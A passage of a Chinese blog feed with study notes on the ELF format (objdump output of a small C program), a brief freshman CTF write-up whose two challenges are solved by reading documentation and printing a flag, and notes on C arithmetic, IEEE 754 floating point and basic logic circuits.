00000000 90c9c3f3 0f1efa55  ...............U</span><br><span class="line"> 0030 4889e548 83ec10c7 45fc0300 00008b15  H..H....E.......</span><br><span class="line"> 0040 00000000 8b050000 000001c2 8b45fc01  .............E..</span><br><span class="line"> 0050 d089c7e8 00000000 b8000000 00c9c3    ............... </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;print&gt;:</span><br><span class="line">   0:f3 0f 1e fa          endbr64 </span><br><span class="line">   4:55                   push   %rbp</span><br><span class="line">   5:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">   8:48 83 ec 10          sub    $0x10,%rsp</span><br><span class="line">   c:89 7d fc             mov    %edi,-0x4(%rbp)</span><br><span class="line">   f:8b 45 fc             mov    -0x4(%rbp),%eax</span><br><span class="line">  12:89 c6                mov    %eax,%esi</span><br><span class="line">  14:48 8d 05 00 00 00 00 lea    0x0(%rip),%rax        # 1b &lt;print+0x1b&gt;</span><br><span class="line">17: R_X86_64_PC32.rodata-0x4</span><br><span class="line">  1b:48 89 c7             mov    %rax,%rdi</span><br><span class="line">  1e:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  23:e8 00 00 00 00       call   28 &lt;print+0x28&gt;</span><br><span class="line">24: R_X86_64_PLT32printf-0x4</span><br><span class="line">  28:90                   nop</span><br><span class="line">  29:c9                   leave  </span><br><span class="line">  2a:c3                   ret    </span><br><span class="line"></span><br><span class="line">000000000000002b &lt;main&gt;:</span><br><span class="line">  2b:f3 0f 1e fa          endbr64 </span><br><span class="line">  2f:55                   push   %rbp</span><br><span class="line">  30:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  33:48 83 ec 10          sub    $0x10,%rsp</span><br><span class="line">  37:c7 45 fc 03 00 00 00 movl   $0x3,-0x4(%rbp)</span><br><span class="line">  3e:8b 15 00 00 00 00    mov    0x0(%rip),%edx        # 44 &lt;main+0x19&gt;</span><br><span class="line">40: R_X86_64_PC32global_init_num-0x4</span><br><span class="line">  44:8b 05 00 00 00 00    mov    0x0(%rip),%eax        # 4a &lt;main+0x1f&gt;</span><br><span class="line">46: R_X86_64_PC32.data</span><br><span class="line">  4a:01 c2                add    %eax,%edx</span><br><span class="line">  4c:8b 45 fc             mov    -0x4(%rbp),%eax</span><br><span class="line">  4f:01 d0                add    %edx,%eax</span><br><span class="line">  51:89 c7                mov    %eax,%edi</span><br><span class="line">  53:e8 00 00 00 00       call   58 &lt;main+0x2d&gt;</span><br><span class="line">54: R_X86_64_PLT32print-0x4</span><br><span class="line">  58:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  5d:c9                   leave  </span><br><span class="line">  5e:c3                   ret</span><br></pre></td></tr></table></figure><p><strong>接下来是数据节和只读数据节。可以看到.data节保存已经初始化的全局变量和局部静态变量。源代码中共有两个这样的变量: global_init_num ( O1000000 )和 local_static_init_num ( 02000000 )，每个变量4个字节，一共8个字节。</strong></p><p><strong>.rodata节保存只读数据，包括只读变量和字符串常量。源代码中调用printf()函数时，用到了一个字符串“%d\n”,它是一种只读数据,因此保存在.rodata节中,可以看到字符串常量的ASCII形式，以“\0”结尾。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">1 .data         00000008  0000000000000000  0000000000000000  000000a0  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">3 .rodata       00000004  0000000000000000  0000000000000000  000000a8  2**0</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Contents of section .data:</span><br><span class="line"> 0000 01000000 02000000                    ........        </span><br><span class="line">Contents of section .rodata:</span><br><span class="line"> 0000 25640a00                             %d..            </span><br></pre></td></tr></table></figure><p>**最后是BSS 节，用于保存未初始化的全局变量和局部静态变量。如果仔细观察，会发现该节没有CONTENTS属性，这表示该节在文件中实际上并不存在，只是为变量预留了位置而已，因此该节的sh_offset域也就没有意义了。 **  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">2 .bss          00000008  0000000000000000  0000000000000000  000000a8  2**2</span><br><span class="line">                  ALLOC</span><br></pre></td></tr></table></figure><p><del>未完待续</del></p><blockquote><p>参照《CTF竞赛权威指导（Pwn篇）》</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;ELF（Executable and Linkable Format），“可执行可链接格式”，是UNIX系统实验室（USL）作为应用程序二进制接口（Application Binary Interface，ABI）而开发和发布的，也是Linux的主要可执行文</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>西电新生赛WP--PWN篇</title>
    <link href="http://antihypezero.github.io/2022/09/17/%E8%A5%BF%E7%94%B5%E6%96%B0%E7%94%9F%E8%B5%9BWP/"/>
    <id>http://antihypezero.github.io/2022/09/17/%E8%A5%BF%E7%94%B5%E6%96%B0%E7%94%9F%E8%B5%9BWP/</id>
    <published>2022-09-17T13:08:24.699Z</published>
    <updated>2022-09-19T10:40:35.560Z</updated>
    
    <content type="html"><![CDATA[<h2 id="二进制漏洞审计之入门指北"><a href="#二进制漏洞审计之入门指北" class="headerlink" title="二进制漏洞审计之入门指北"></a>二进制漏洞审计之入门指北</h2><p>阅读文档，flag在文档文档最后</p><p>（<del>忘记截图了</del>）</p><p>##shell</p><p>打开Linux，复制题目地址</p><p>然后输入cat flag</p><p><img src="https://s3.bmp.ovh/imgs/2022/09/17/b407518286ea40de.bmp"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;二进制漏洞审计之入门指北&quot;&gt;&lt;a href=&quot;#二进制漏洞审计之入门指北&quot; class=&quot;headerlink&quot; title=&quot;二进制漏洞审计之入门指北&quot;&gt;&lt;/a&gt;二进制漏洞审计之入门指北&lt;/h2&gt;&lt;p&gt;阅读文档，flag在文档文档最后&lt;/p&gt;
&lt;p&gt;（&lt;del&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>C语言中的运算</title>
    <link href="http://antihypezero.github.io/2022/07/23/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E8%BF%90%E7%AE%97/"/>
    <id>http://antihypezero.github.io/2022/07/23/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E8%BF%90%E7%AE%97/</id>
    <published>2022-07-22T18:03:13.004Z</published>
    <updated>2022-07-22T18:03:13.004Z</updated>
    
    <content type="html"><![CDATA[<h3 id="从C表达式到运算类指令"><a href="#从C表达式到运算类指令" class="headerlink" title="从C表达式到运算类指令"></a>从C表达式到运算类指令</h3><ul><li>基本数据类型<ul><li>无符号数(二进制位串)、带符号整数(补码)</li><li>浮点数(IEEE 754标准）</li><li>位串、字符（串）（ASCII码）</li></ul></li><li>基本运算类型<ul><li>算术(+ - * &#x2F; %  &gt; &lt; &gt;&#x3D; &lt;&#x3D; &#x3D;&#x3D; !&#x3D;)</li><li>按位( | &amp; ~ ^)</li><li>逻辑( || &amp;&amp; ！)</li><li>移位( &lt;&lt; &gt;&gt;）</li><li>扩展和截断</li></ul></li></ul><blockquote><p>例如：对于C赋值语句 y&#x3D;(x&gt;&gt;2)+k，如何在计算机中实现呢？<br>转换为指令序列，通过执行运算类指令来实现！</p></blockquote><h3 id="从运算指令到运算电路"><a href="#从运算指令到运算电路" class="headerlink" title="从运算指令到运算电路"></a>从运算指令到运算电路</h3><p><strong>计算机如何实现高级语言程序中的运算？</strong></p><ul><li>将各类表达式编译（转换）为指令序列<blockquote><p>例如：y&#x3D;(x&gt;&gt;2)+k 转换为以下指令序列：<br> sarw $2, %ax ; x&gt;&gt;2<br> addw %bx, %ax ; (x&gt;&gt;2) + k</p></blockquote></li><li>计算机直接执行指令来完成运算<ul><li>控制器对指令进行译码，产生控制信号送运算电路</li></ul></li><li>操作数在运算电路中运算<blockquote><p>sarw $2, %ax：将操作数“2”和“R[ax]”送移位器运算<br>addw %bx, %ax：将R[ax]和R[bx]送整数加减器中运算</p></blockquote></li></ul><p><strong>移位器和整数加减运算器都是由逻辑门电路构成的！</strong></p><h3 id="C语言涉及的运算"><a href="#C语言涉及的运算" class="headerlink" title="C语言涉及的运算"></a>C语言涉及的运算</h3><ul><li>算术运算<ul><li>无符号数、带符号整数、浮点数的+、-、*、&#x2F; 、%运算等</li></ul></li><li>按位运算<ul><li>按位与：&amp;</li><li>按位或：|</li><li>按位取反：~</li><li>按位异或：^</li></ul></li><li>移位运算<ul><li>左移：x&lt;&lt;k; 右移： x&gt;&gt;k</li><li>从运算符无法区分逻辑移位还是算术移位，由x的类型确定</li><li>若x为无符号数：逻辑左（右）移<ul><li>高（低）位移出，低（高）位补0，可能溢出！</li></ul></li><li>若x为带符号整数：算术左移、算术右移<ul><li>左移：高位移出，低位补0。可能溢出！</li><li>溢出判断：若移出的位不等于新的符号位，则溢出。</li><li>右移：低位移出，高位补符，可能发生有效数据丢失。</li></ul></li></ul></li></ul><blockquote><p>例：某字长为8的机器中，x、y和z都是8位带符号整数，已知x&#x3D;-81，则y&#x3D;x&#x2F;2&#x3D;？z&#x3D;2*x&#x3D;？</p></blockquote><blockquote><p>-81&#x3D;-1010001B，故x的机器数为10101111</p><p>y&#x3D;x&#x2F;2 —&gt;x&gt;&gt;1：11010111y&#x3D;-41右移</p><p>z&#x3D;x*2—&gt;x&lt;&lt;1：01011110z&#x3D;94  左移</p></blockquote><blockquote><p>对于一个n（n≥8）位的变量x，请根据C语言中按位运算的定义，<br>写出满足下列要求的C语言表达式。<br>（1）x的最高有效字节不变，其余各位全变为0。<br>（2）x的最低有效字节不变，其余各位全变为0。<br>（3）x的最低有效字节全变为0，其余各位取反。<br>（4）x的最低有效字节全变1，其余各位不变。</p></blockquote><blockquote><p>（1）(x&gt;&gt;(n-8))&lt;&lt;(n-8)<br>（2）x &amp; 0xFF<br>（3）((x^ ~0xFF) &gt;&gt;8 )&lt;&lt; 8<br>（4）x | 0xFF</p></blockquote><ul><li>逻辑运算<ul><li>“‖”表示“OR”运算</li><li>“&amp;&amp;”表示“AND”运算</li><li>“!”表示“NOT”运算</li></ul></li><li>位扩展与位截断运算<ul><li>没有专门操作运算符，根据类型转换前、后数据长短</li><li>扩展：短转长<ul><li>无符号数：0扩展（前面补0）</li><li>带符号整数：符号扩展（前面补符）</li></ul></li><li>截断：长转短</li><li>强行将高位丢弃，故可能发生“溢出</li></ul></li></ul><h3 id="整数加减法运算"><a href="#整数加减法运算" class="headerlink" title="整数加减法运算"></a>整数加减法运算</h3><ul><li>指针、地址等通常被说明为无符号整数，因而在进行指针或地址运算时，需要进行无符号整数的加、减运算</li><li>无符号整数和带符号整数的加、减运算电路完全一样，这个运算电路称为整数加减运算部件，基于带标志加法器实现</li><li>计算机中的加法器，因为只有n位，所以是一种模2^n^运算系统</li></ul><h4 id="运算电路的核心"><a href="#运算电路的核心" class="headerlink" title="运算电路的核心"></a>运算电路的核心</h4><ul><li>计算机中所有运算都基于加法器实现！</li><li>加法器不知道所运算的是带符号数还是无符号数。</li><li>加法器不判定对错，总是取低n位作为结果，并生成标志信息。</li></ul><p><img src="https://s3.bmp.ovh/imgs/2022/07/22/8496c2048e405275.png"></p><h4 id="条件标志位"><a href="#条件标志位" class="headerlink" title="条件标志位"></a>条件标志位</h4><ul><li><p>零标志ZF、溢出标志OF、进&#x2F;借位标志CF、符号标志SF称为条件标志。</p><blockquote><p>OF：若A与B’同号但与Sum不同号，则1，否则0。SF：sum符号<br>ZF：如Sum为0，则1，否则0。CF：Cout ^ sub</p></blockquote></li><li><p>条件标志（Flag）在运算电路中产生，被记录到专门的寄存器中</p></li><li><p>存放标志的寄存器通常称为程序&#x2F;状态字寄存器或标志寄存器，每个标志对应标志寄存器中的一个标志位。 如，IA-32中的EFLAGS寄存器</p></li><li><p>做加法时，主要判断是否溢出</p><blockquote><p>无符号加溢出条件：CF&#x3D;1<br>带符号加溢出条件：OF&#x3D;1</p></blockquote></li><li><p>做减法时，主要判断是否溢出</p><blockquote><p>带符号溢出：<br>(1) 最高位和次高位的进位不同<br>(2) 和的符号位和加数的符号位不同<br>无符号减溢出：<br>差为负数，即借位CF&#x3D;1</p></blockquote></li><li><p>做减法以比较大小，规则：</p><blockquote><p>Unsigned: CF&#x3D;0时，大于<br>Signed：OF&#x3D;SF时，大于</p></blockquote></li></ul><h3 id="整数乘法运算"><a href="#整数乘法运算" class="headerlink" title="整数乘法运算"></a>整数乘法运算</h3><ul><li>通常，高级语言中两个n位整数相乘得到的结果通常也是一个n位整数，也即结果只取2n位乘积中的低n位。</li></ul><blockquote><p>假定两个n位无符号整数Xu和Yu对应的机器数为Xu和Yu， Pu&#x3D;Xu×Yu，Pu为n位无符号整数且对应的机器数为Pu；<br>两个n位带符号整数Xs和Ys对应的机器数为Xs和Ys，Ps&#x3D;Xs×Ys，Ps 为n位带符号整数且对应的机器数为Ps。<br>  若Xu&#x3D;Xs且Yu&#x3D;Ys，则Pu&#x3D;Ps。</p></blockquote><p>  无符号：若Puh&#x3D;0，则不溢出<br>  带符号：若Psh每位都等于Ps的最高位，则不溢出</p><ul><li><p>X*Y的高n位可以用来判断溢出，规则如下：</p></li><li><p>无符号：若高n位全0，则不溢出，否则溢出</p></li><li><p>带符号：若高n位全0或全1且等于低n位的最高位，则不溢出 </p></li><li><p>硬件不判溢出，仅保留2n位乘积，供软件使用</p><ul><li>如果程序不采用防止溢出的措施，且编译器也不生成用于溢出处理的代码，就会发生一些由于整数溢出而带来的问题。</li><li>指令：分无符号数乘指令、带符号整数乘指令</li><li>乘法指令的操作数长度为n,而乘积长度为2n。</li></ul></li></ul><p><strong>乘法指令不生成溢出标志，编译器可使用2n位乘积来判断是否溢出</strong></p><h3 id="整数除法运算"><a href="#整数除法运算" class="headerlink" title="整数除法运算"></a>整数除法运算</h3><ul><li><p>对于带符号整数来说，n位整数除以n位整数，除-2^n-1^&#x2F;-1&#x3D;2^n-1^会发生溢出外，其余情况都不会发生溢出。</p></li><li><p>因为整数除法，其商也是整数，所以，在不能整除时需要进行舍入，通常按照朝0方向舍入，即正数商取比自身小的最接近整数（Floor，地板），负数商取比自身大的最接近整数（Ceiling，天板）。</p><blockquote><p>7&#x2F;2&#x3D;3-7&#x2F;2&#x3D;-3</p></blockquote></li><li><p>整除0的结果无法用一个机器数表示</p></li><li><p>整数除法时，除数不能为0，否则会发生“异常”，此时，需要调出操作系统中的异常处理程序来处理。</p></li></ul><h4 id="变量与常数之间的除运算"><a href="#变量与常数之间的除运算" class="headerlink" title="变量与常数之间的除运算"></a>变量与常数之间的除运算</h4><ul><li><p>对于整数除法运算，由于计算机中除法运算比较复杂，而且不能<br>用流水线方式实现，所以一次除法运算大致需要30个或更多个时<br>钟周期，比乘法指令的时间还要长！</p></li><li><p>为了缩短除法运算的时间，编译器在处理一个变量与一个2的幂<br>次形式的整数相除时，常采用右移运算来实现。</p><ul><li>无符号：逻辑右移</li><li>带符号：算术右移</li></ul></li><li><p>结果一定取整数</p><ul><li>能整除时，直接右移得到结果，移出的为全0<blockquote><p>例如，12&#x2F;4&#x3D;3：0000 1100&gt;&gt;2&#x3D;0000 0011<br>-12&#x2F;4&#x3D;-3：1111 0100 &gt;&gt;2&#x3D;1111 1101</p></blockquote></li><li>不能整除时，右移移出的位中有非0，需要进行相应处理</li></ul></li><li><p>不能整除时，采用朝零舍入，即截断方式</p><ul><li>无符号数、带符号正整数（地板）：移出的低位直接丢弃</li><li>带符号负整数（天板 ）：加偏移量(2^k^-1)，然后再右移k</li></ul><blockquote><p>无符号数 14&#x2F;4&#x3D;3：0000 1110&gt;&gt;2&#x3D;0000 0011<br>带符号负整数 -14&#x2F;4&#x3D;-3<br>若直接截断，则 1111 0010 &gt;&gt;2&#x3D;1111 1100&#x3D;-4≠-3<br>应先纠偏，再右移: k&#x3D;2, 故(-14+22-1)&#x2F;4&#x3D;-3<br>即： 1111 0010+0000 0011&#x3D;1111 0101<br>1111 0101&gt;&gt;2&#x3D;1111 1101&#x3D;-3</p></blockquote></li></ul><h3 id="浮点数运算"><a href="#浮点数运算" class="headerlink" title="浮点数运算"></a>浮点数运算</h3><h4 id="运算方式"><a href="#运算方式" class="headerlink" title="运算方式"></a>运算方式</h4><blockquote><p>设两个规格化浮点数分别为 A&#x3D;Ma×2^Ea^ B&#x3D;Mb×2^Eb^ ,则：<br>A±B &#x3D;(Ma ± Mb×2^-(Ea-Eb)^)×2^Ea^ (假设Ea&gt;&#x3D;Eb )<br>A×B &#x3D;(Ma×Mb)×2^(Ea+Eb)^<br>A&#x2F;B &#x3D;(Ma &#x2F; Mb)×2^(Ea-Eb)^</p></blockquote><p><strong>上述运算结果可能出现以下几种情况：</strong></p><ul><li><p>阶码上溢：一个正指数超过了最大允许值 &#x3D;〉+∞&#x2F;-∞&#x2F;溢出</p></li><li><p>阶码下溢：一个负指数超过了最小允许值 &#x3D;〉+0&#x2F;-0</p></li><li><p>尾数溢出：最高有效位有进位 &#x3D;〉右规</p></li><li><p>非规格化尾数：数值部分高位为0 &#x3D;〉左规</p></li><li><p>右规或对阶时，右段有效位丢失 &#x3D;〉尾数舍入</p></li></ul><p><strong>IEEE建议实现时为每种异常情况提供一个自陷允许位。若某异常对应的位为1，则发生相应异常时，就调用一个特定的异常处理程序执行。</strong></p><h4 id="IEEE-754-标准规定的五种异常情况"><a href="#IEEE-754-标准规定的五种异常情况" class="headerlink" title="IEEE 754 标准规定的五种异常情况"></a>IEEE 754 标准规定的五种异常情况</h4><ul><li><p>无效运算（无意义）</p><ul><li>运算时有一个数是非有限数，如：加 &#x2F; 减∞、0 x ∞、 ∞&#x2F;∞等</li><li>结果无效，如：源操作数是NaN、0&#x2F;0、x REM 0、 ∞ REM y 等</li></ul></li><li><p>除以0（即：无穷大）</p></li><li><p>数太大（阶上溢）: 对于SP，指阶码 E &gt;1111 1110 （指数大于127）</p></li><li><p>数太小（阶下溢） : 对于SP，指阶码 E &lt; 0000 0001（指数小于-126 ）</p></li><li><p>结果不精确（舍入时引起），例如1&#x2F;3、1&#x2F;10等不能精确表示成浮点数</p></li></ul><p><strong>上述情况硬件可以捕捉到，因此这些异常可设定让硬件处理，也可设定让软件处理。让硬件处理时，称为硬件陷阱。</strong></p><h4 id="浮点数加-x2F-减运算"><a href="#浮点数加-x2F-减运算" class="headerlink" title="浮点数加&#x2F;减运算"></a>浮点数加&#x2F;减运算</h4><ul><li>“对阶”操作：目的是使两数阶码相等<ul><li>小阶向大阶看齐，阶小的那个数的尾数右移，右移位数等于两个阶码差的绝对值</li><li>IEEE 754尾数右移时，要将隐含的“1”移到小数部分，高位补0，移出的低位保留到特定的“附加位”上</li></ul></li></ul><p><strong>基本要点</strong></p><p>（假定：Xm、Ym分别是X和Y的尾数， Xe和Ye 分别是X和Y的阶码 ）</p><ol><li><p>求阶差：∆e&#x3D;Xe – Ye (若Ye &gt; Xe，则结果的阶码为Ye)</p></li><li><p>对阶：将Xm右移∆e位，尾数变为 Xm*2Xe-Ye（保留右移部分附加位）</p></li><li><p>尾数加减： Xm×2^Xe-Ye^ ± Ym</p></li><li><p>规格化：</p><ul><li>当尾数高位为0，则需左规：尾数左移一次，阶码减1，直到MSB为1<br>每次阶码减1后要判断阶码是否下溢（比最小可表示的阶码还要小）</li><li>当尾数最高位有进位，需右规：尾数右移一次，阶码加1，直到MSB为1<br>每次阶码加1后要判断阶码是否上溢（比最大可表示的阶码还要大）</li><li>阶码溢出异常处理：阶码上溢，则结果溢出；阶码下溢，则结果为0</li></ul></li><li><p>如果尾数比规定位数长（有附加位），则需考虑舍入（有多种舍入方式）</p></li><li><p>若运算结果尾数是0，则需要将阶码也置0。</p></li></ol><h4 id="附加位"><a href="#附加位" class="headerlink" title="附加位"></a>附加位</h4><p><strong>IEEE754规定: 中间结果须在右边加2个附加位 （guard &amp; round）</strong></p><ul><li>Guard (保护位)：在significand右边的位</li><li>Round (舍入位)：在保护位右边的位</li></ul><p><strong>附加位的作用：用以保护对阶时右移的位或运算的中间结果。<br>附加位的处理：①左规时被移到significand中; ② 作为舍入的依据。</strong></p><h4 id="舍入方式"><a href="#舍入方式" class="headerlink" title="舍入方式"></a>舍入方式</h4><p><img src="https://s3.bmp.ovh/imgs/2022/07/23/de3395d7a9315ba0.png"></p><ul><li>就近舍入：舍入为最近可表示的数<ul><li>非中间值：0舍1入</li><li>中间值：强迫结果为偶数</li></ul></li></ul><blockquote><p>附加位为01：舍11：入10：强迫结果为偶数<br>1.110111 → 1.1110; 1.110101 → 1.1101;<br>1.110110 → 1.1110; 1.111110 → 10.0000;</p></blockquote><ul><li>朝+∞方向舍入:舍入为Z2(正向舍入)</li><li>朝-∞方向舍入:舍入为Z1(负向舍入)</li><li>朝0方向舍入：截去。正数：取Z1; 负数：取Z2</li></ul><h4 id="浮点数比较运算举例"><a href="#浮点数比较运算举例" class="headerlink" title="浮点数比较运算举例"></a>浮点数比较运算举例</h4><p><strong>判断是否为真</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">float</span> f;</span><br><span class="line"><span class="type">double</span> d;</span><br></pre></td></tr></table></figure><blockquote><p>x &#x3D;&#x3D; (int)(float) x否<br>x &#x3D;&#x3D; (int)(double) x是<br>f &#x3D;&#x3D; (float)(double) f是<br>d &#x3D;&#x3D; (float) d否<br>f &#x3D;&#x3D; -(-f);是<br>2&#x2F;3 &#x3D;&#x3D; 2&#x2F;3.0否<br>d &lt; 0.0 &#x3D;&gt;((d<em>2) &lt; 0.0)是<br>d &gt; f -f &gt; -d是<br>d * d &gt;&#x3D; 0.0是<br>x</em>x&gt;&#x3D;0否<br>(d+f)-d &#x3D;&#x3D; f否</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;从C表达式到运算类指令&quot;&gt;&lt;a href=&quot;#从C表达式到运算类指令&quot; class=&quot;headerlink&quot; title=&quot;从C表达式到运算类指令&quot;&gt;&lt;/a&gt;从C表达式到运算类指令&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;基本数据类型&lt;ul&gt;
&lt;li&gt;无符号数(二进制位串)、带</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>数字逻辑电路基础</title>
    <link href="http://antihypezero.github.io/2022/07/22/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9F%BA%E7%A1%80/"/>
    <id>http://antihypezero.github.io/2022/07/22/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9F%BA%E7%A1%80/</id>
    <published>2022-07-22T11:50:01.753Z</published>
    <updated>2022-07-22T11:50:01.753Z</updated>
    
    <content type="html"><![CDATA[<h3 id="布尔代数"><a href="#布尔代数" class="headerlink" title="布尔代数"></a>布尔代数</h3><p><strong>关于0和1的一套数学运算体系起源于1850年前后英国数学家乔治·布尔（ George Boole ）的工作，因此称为布尔代数。</strong></p><ul><li>0和1分别代表逻辑值“假”和“真</li><li>通过逻辑关系可以构建基于0和1的布尔代数运算</li><li>最基本的逻辑运算有：与（ AND )、或（ OR )、非（ NOT )，运算符分别为&amp;、|、~</li></ul><table><thead><tr><th>A</th><th>B</th><th>A&amp;B</th><th>A|B</th><th>~A</th><th>A^B</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td></tr><tr><td>0</td><td>1</td><td>0</td><td>1</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td></tr><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td></tr></tbody></table><ul><li>任何一种辑表达式都可写成这三种基本运算的逻辑组合。例如，异或（ XOR ）运算的逻辑表达式为：<br> A^B &#x3D; ~A · B + A · ~B ，异或运算也称不等价运算。</li></ul><h3 id="一位逻辑门电路"><a href="#一位逻辑门电路" class="headerlink" title="一位逻辑门电路"></a>一位逻辑门电路</h3><ul><li>可通过逻辑门电路来实现逻辑运算<ul><li>三种基本门电路：与门、或门、非门</li><li>其他门电路可以由三种基本门电路组合形成（如异或门电路）</li></ul></li></ul><p><img src="https://s3.bmp.ovh/imgs/2022/07/22/d476103cd1c3fd21.png"></p><h3 id="n位逻辑门电路"><a href="#n位逻辑门电路" class="headerlink" title="n位逻辑门电路"></a>n位逻辑门电路</h3><ul><li>对于 n 位逻辑运算，只要重复使用 n 个相同的门电路即可<ul><li>例如，若 A &#x3D; An -1An-2… A1A0，B &#x3D; Bn-1Bn-2… B1B0，则与运算 F &#x3D; A · B ，实际上是按位相与，即Fi&#x3D;Ai·Bi(0&lt;&#x3D;i&lt;&#x3D;n-1)</li><li>假定逻辑值位数为 n ，则按位与、按位或、按位取反、按位异或的逻辑符号如图所示</li></ul></li></ul><p><img src="https://s3.bmp.ovh/imgs/2022/07/22/21d4bf8ff81884ac.png"></p><h3 id="组合逻辑部件"><a href="#组合逻辑部件" class="headerlink" title="组合逻辑部件"></a>组合逻辑部件</h3><ul><li><p>根据电路是否具有存储功能，将逻辑电路划分为两种类型</p><ul><li><p>组合逻辑电路：没有存储功能，其输出仅依赖于当前输入</p></li><li><p>时序逻辑电路：具有存储功能，其输出不仅依赖于当前输入，还依赖于存储单元的当前状态</p></li></ul></li><li><p>可以利用基本逻辑门电路构成一些具有特定功能的组合逻辑部件(功能部件)</p><ul><li>如译码器、编码器、多路选择器、加法器等</li></ul></li><li><p>实现一个功能部件的过程</p><ul><li>用一个真值表描述功能部件的输入和输出之间的关系</li><li>根据真值表确定逻辑表达式</li><li>根据逻辑表达式实现逻辑电路</li></ul></li></ul><h3 id="多路选择器"><a href="#多路选择器" class="headerlink" title="多路选择器"></a>多路选择器</h3><ul><li>最简单的多路选择器（ MUX ）是二路选择器<ul><li>有两个输入端 A 和 B ，一个输出端 F ，并有一个控制端 S ，其功能是：当 S 为 O 时， F &#x3D; A ；当 S 为1时， F &#x3D; B 。</li></ul></li><li>k 路选择器应有 k 路输入，因而控制端 S 的位数应是「 log2k 」<ul><li>例如，3路或4路选择器， S 有两位；5~8路选择器， S 有3位。</li></ul></li></ul><h3 id="一位加法器（全加器）"><a href="#一位加法器（全加器）" class="headerlink" title="一位加法器（全加器）"></a>一位加法器（全加器）</h3><ul><li>两个加数为A和B，低位进位为Cin，和为F，向高位的进位为Cout</li><li>逻辑表达式为：<ul><li>F&#x3D;A ^ B ^ Cin</li><li>Cout&#x3D;A·B+A·Cin+B·Cin</li></ul></li></ul><img src="https://s3.bmp.ovh/imgs/2022/07/22/2a76e87d79cf4525.png" style="zoom:50%;" /><ul><li>n位加法器可用n个全加器实现</li></ul><h3 id="N位带标志加法器"><a href="#N位带标志加法器" class="headerlink" title="N位带标志加法器"></a>N位带标志加法器</h3><ul><li>n位加法器无法用于两个n位带符号整数（补码）相加，无法判断是否溢出</li><li>程序中经常需要比较大小，通（在加法器中）做减法得到的标志信息来判断</li></ul><p><img src="https://s3.bmp.ovh/imgs/2022/07/22/4145a71037e7c9c4.png"></p><ul><li>溢出标志OF：OF&#x3D;Cn^Cn-1</li><li>符号标志SF：SF&#x3D;Fn-1</li><li>零标志ZF&#x3D;1，当且仅当F&#x3D;0；</li><li>进位&#x2F;借位标志CF：CF&#x3D;Cout^Cin</li></ul><h3 id="n位整数加-x2F-减运算器"><a href="#n位整数加-x2F-减运算器" class="headerlink" title="n位整数加&#x2F;减运算器"></a>n位整数加&#x2F;减运算器</h3><ul><li><p>补码加减运算公式</p></li><li><p>[A+B]补 &#x3D; [A]补 + [B] 补 ( mod 2^n^)</p></li><li><p>[A–B]补 &#x3D; [A]补 + [–B] 补 ( mod 2^n^)</p></li><li><p>利用带标志加法器，可构造整数加&#x2F;减运算器，进行以下运算：</p></li><li><p>无符号整数加、无符号整数减</p></li><li><p>带符号整数加、带符号整数减</p></li><li><p>在整数加&#x2F;减运算部件基础上，加上寄存器、移位器以及控制逻辑，就可实现ALU、乘&#x2F;除运算以及浮点运算电路</p></li></ul><p><img src="https://s3.bmp.ovh/imgs/2022/07/22/13553eeff390af8b.png"></p><ul><li>当Sub为1时，做减法</li><li>当Sub为0时，做加法</li></ul><h3 id="算术逻辑部件-ALU"><a href="#算术逻辑部件-ALU" class="headerlink" 